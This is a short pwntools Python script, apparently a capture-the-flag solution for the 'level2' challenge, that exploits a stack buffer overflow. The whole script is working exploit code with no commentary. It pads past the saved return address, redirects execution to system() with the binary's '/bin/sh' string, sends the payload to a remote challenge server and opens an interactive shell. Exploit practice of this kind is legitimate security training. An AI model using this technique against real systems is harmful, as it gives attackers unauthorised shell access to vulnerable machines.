from pwn import *

# sh = process('./level2')
sh = remote('pwn2.jarvisoj.com', 9878)

elf = ELF('./level2')

sys_addr = elf.symbols['system']

shell_addr = elf.search('/bin/sh').next()

payload = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xaaaaaaaa) + p32(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()